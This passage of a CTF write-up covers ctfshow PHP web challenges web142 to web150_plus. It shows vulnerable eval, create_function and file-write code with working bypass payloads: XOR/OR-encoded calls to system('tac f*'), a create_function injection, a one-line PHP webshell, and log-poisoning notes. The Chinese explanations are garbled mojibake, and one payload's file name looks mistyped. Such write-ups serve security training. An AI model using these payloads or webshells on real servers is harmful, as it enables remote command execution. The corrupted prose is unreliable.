punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>åŒ142ï¼Œbanäº†å–åå’Œæˆ–åŒæ—¶ä¹Ÿbanäº†+-å¯ä»¥ä½¿ç”¨*ï¼Œå¥½åƒæ²¡banå¼‚æˆ–<code>^</code></p><p>Payload:<code>?v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%0c%01%07%01%0f%08%0f&quot;^&quot;%7f%60%60%20%60%60%60%60%2f%7f%60%7f&quot;)*</code></p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\W+$/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">1</span><span class="token operator">?</span><span class="token constant boolean">true</span><span class="token punctuation">:</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>é™åˆ¶äº†v3çš„é•¿åº¦ï¼Œå¹¶å¯¹v2è¿›è¡Œcheck,å¯ä»¥ä½¿ç”¨<code>|``^</code>åªæ˜¯è°ƒæ¢ä½ç½®ç½¢äº†</p><p>Payload:<code>?v1=1&amp;v2=(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&amp;v3=-</code></p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span> <span class="token operator">=</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v1</span></span><span class="token interpolation"><span class="token variable">$v3</span></span><span class="token interpolation"><span class="token variable">$v2</span></span> = "</span><span class="token operator">.</span><span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­£åˆ™è¿ç®—éƒ½è¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨<code>|</code>å’Œ<code>~</code>æˆ–è€…ä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¦å¤–<code>&quot;</code>ä¹Ÿè¢«banäº†ï¼Œå¯ä»¥ä½¿ç”¨<code>&#39;</code></p><p>Payload:</p><blockquote><p>?v1&#x3D;0&amp;v2&#x3D;0&amp;v3&#x3D;|(â€˜%13%19%13%14%05%0dâ€™|â€™%60%60%60%60%60%60â€™)(â€˜%14%01%03%00%06%0c%01%07%02%10%08%10â€™|â€™%60%60%60%20%60%60%60%60%2c%60%60%60â€™)|</p><p>?v1&#x3D;%0a1&amp;v2&#x3D;%0a0&amp;v3&#x3D;?(<del>%8c%86%8c%8b%9a%92)(</del>%9c%9e%8b%df%99%d5):</p></blockquote><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><p>ä¸‰ç›®è¿ç®—ç¬¦è¢«banäº†ï¼Œä½†æ˜¯å½±å“ä¸å¤§</p><h4 id="web147-PHPå‘½åç©ºé—´-create-functionå‡½æ•°ä»£ç æ³¨å…¥"><a href="#web147-PHPå‘½åç©ºé—´-create-functionå‡½æ•°ä»£ç æ³¨å…¥" class="headerlink" title="web147(PHPå‘½åç©ºé—´  create_functionå‡½æ•°ä»£ç æ³¨å…¥)"></a>web147(PHPå‘½åç©ºé—´  create_functionå‡½æ•°ä»£ç æ³¨å…¥)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$ctfshow</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­£åˆ™åŒ¹é…ç»•è¿‡ï¼Œåªè¦ctfshowé‡Œæœ‰ä¸€ä¸ªä¸æ˜¯æ•°å­—ã€å°å†™å­—æ¯å’Œä¸‹åˆ’çº¿å°±èƒ½ç»•è¿‡ã€‚</p><blockquote><p><strong>&#x2F;i</strong>ï¼šå¤§å°å†™ä¸æ•æ„ŸåŒ¹é…</p><p><strong>&#x2F;s</strong>ï¼šç‚¹å·å…ƒå­—ç¬¦åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…å«æ¢è¡Œç¬¦ã€‚</p><p><strong>&#x2F;D</strong>ï¼šå…ƒå­—ç¬¦ç¾å…ƒç¬¦å·ä»…ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ«å°¾</p></blockquote><blockquote><p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ç›´æ¥å†™å‡½æ•°åfunction_name()ï¼Œç›¸å½“äºæ˜¯ç›¸å¯¹è·¯å¾„è°ƒç”¨ï¼› å¦‚å†™æŸä¸€å…¨å±€å‡½æ•°çš„å®Œå…¨é™å®šåç§°\function_name()è°ƒç”¨ï¼Œåˆ™æ˜¯å†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚</p></blockquote><p><img src="web147.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><p>ï¼ˆè¯¦æƒ…å¯ä»¥çœ‹phpæ‰‹å†Œé‡Œçš„å‘½åç©ºé—´éƒ¨åˆ†ï¼‰</p><p>æ‰€ä»¥postæ—¶<code>ctf</code>å¯ä»¥é€šè¿‡åŠ ä¸Š<code>\</code>ç»•è¿‡åŒ¹é…ã€‚%5c</p><p>æ‰¾ä¸ªä¸éœ€è¦ç¬¬ä¸€ä¸ªå‚æ•°çš„å‡½æ•°ã€‚å¯ä»¥ç”¨create_functionåŒ¿åå‡½æ•°ã€‚è™½ç„¶è¯¥å‡½æ•°è‡ªPHP 7.2èµ·å·²ç»å¼ƒç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥evalæ‰§è¡Œå‡½æ•°ï¼Œåªæ˜¯éœ€è¦æŠŠåŒ¿åéƒ¨åˆ†é—­åˆã€‚</p><p><strong>get</strong>ï¼š<code>?show=&#125;system(&#39;tac f*&#39;);/*</code> <strong>post</strong>ï¼š<code>ctf=%5ccreate_function</code> <img src="web147_2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><p>å¯ä»¥è¿™ä¹ˆç†è§£ï¼šcreate_functionåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œæˆ‘ä»¬å‡è®¾å°±å«nimingã€‚ <code>string create_function( string $args, string $code)</code>é‚£ä¹ˆå…·ä½“å°±æ˜¯å¦‚ä¸‹é¢æ‰€ç¤ºçš„æ ·å­ï¼š</p><pre class="language-none"><code class="language-none">function niming($args,...)&#123;$code&#125;</code></pre><p>æ‰€ä»¥å°±éœ€è¦<code>&#125;</code>é—­åˆï¼Œé—­åˆä¹‹åï¼Œé‚£å°±å¤šå‡ºæ¥ä¸€ä¸ª<code>&#125;</code>ï¼Œè¿™å°±éœ€è¦ç”¨æ³¨é‡Šç¬¦æ³¨é‡Šæ‰ã€‚</p><h4 id="web148-ä¸­æ–‡å˜é‡-å¼‚æˆ–"><a href="#web148-ä¸­æ–‡å˜é‡-å¼‚æˆ–" class="headerlink" title="web148(ä¸­æ–‡å˜é‡  å¼‚æˆ–)"></a>web148(ä¸­æ–‡å˜é‡  å¼‚æˆ–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9_\%\\|\~\'\,\.\:\@\&amp;\*\+\- ]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_ctfshow_fl0g</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ²¡banå¼‚æˆ–</p><p>Payloadï¼š<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</code></p><p>é¢„æœŸè§£æ˜¯ä½¿ç”¨ä¸­æ–‡ <code>?code=$å“ˆ=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$å“ˆ&#125;[å“¼]($&#123;$å“ˆ&#125;[å—¯]);&amp;å“¼=system&amp;å—¯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;</code> å¼‚æˆ–å‡ºæ¥çš„ç»“æœæ˜¯ _GET</p><h4 id="web149-unlink-æ–‡ä»¶è¦†ç›–"><a href="#web149-unlink-æ–‡ä»¶è¦†ç›–" class="headerlink" title="web149(unlink  æ–‡ä»¶è¦†ç›–)"></a>web149(unlink  æ–‡ä»¶è¦†ç›–)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p><strong>unlink()</strong> å‡½æ•°åˆ é™¤æ–‡ä»¶ã€‚</p><p>è‹¥æˆåŠŸï¼Œåˆ™è¿”å› trueï¼Œå¤±è´¥åˆ™è¿”å› falseã€‚</p><p>ç›´æ¥å‘index.phpå†™é©¬å°±è¡Œ</p><p>Payload</p><blockquote><p>GET:?ctf&#x3D;indx.php</p><p>POST:show&#x3D;<?php system($_GET[a]);?></p></blockquote><h4 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CTFSHOW</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$vip</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">secret</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">isVIP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">vip</span><span class="token operator">?</span><span class="token constant boolean">TRUE</span><span class="token punctuation">:</span><span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__autoload</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$class</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">#è¿‡æ»¤å­—ç¬¦</span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\_| |\[|\]|\?/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$__CTFSHOW__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"class is exists!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$isVIP</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>isVIPå¯ä»¥é€šè¿‡extractè¿›è¡Œå˜é‡è¦†ç›–ï¼Œctfè¢«é™åˆ¶ä¸èƒ½æœ‰:</p><p>å¯ä»¥åˆ©ç”¨nginxæ—¥å¿—æ–‡ä»¶å†™é©¬</p><p><img src="web150.png" loading="lazy"></p><h4 id="web150-plus-autoload-class-exists"><a href="#web150-plus-autoload-class-exists" class="headerlink" title="web150_plus(__autoload  class_exists)"></a>web150_plus(__autoload  class_exists)</h4><p>è¿‡æ»¤äº†logï¼Œçœ‹ç€å¯ä»¥ç”¨æ¡ä»¶ç«äº‰</p><p>çœ‹äº†hint åˆ©ç”¨ <code>__autoload()</code></p><p>äºæ˜¯æŸ¥äº†ä¸€ä¸‹ <code>class_exists()</code> è¿™ä¸ªå‡½æ•°</p><p><img src="web150_plus.png" alt="https://img.exp10it.io/img/202208131706165.png" loading="lazy"></p><p>ä¿®å¤äº†éé¢„æœŸï¼Œä¸è®©åŒ…å«æ—¥å¿—æ–‡ä»¶äº†ã€‚</p><p>è¿™é‡Œåˆ©ç”¨äº† <code>extract</code> è¦†ç›–å˜é‡ä¼šæŠŠ <code>ç©ºæ ¼ [ .</code> éƒ½ç»™è½¬æˆä¸‹åˆ’çº¿çš„ç‰¹æ€§ï¼Œç»•è¿‡æ­£åˆ™è¿‡æ»¤ã€‚ç„¶åå°±æ˜¯ <a href="https://www.php.net/manual/zh/function.class-exists.php"><code>class_exists</code></a> ç¬¬äºŒä¸ªå‚æ•°é»˜è®¤ä¸º <code>true</code>ï¼Œåœ¨ç±»ä¸å­˜åœ¨æ—¶ä¼šè°ƒç”¨ <code>__autoload</code> å‡½æ•°ï¼Œ<code>__autoload</code> è¿™é‡Œå†™çš„æ˜¯è°ƒç”¨è¦åŠ è½½çš„ç±»åçš„å‡½æ•°ï¼Œä¼  <code>phpinfo</code> 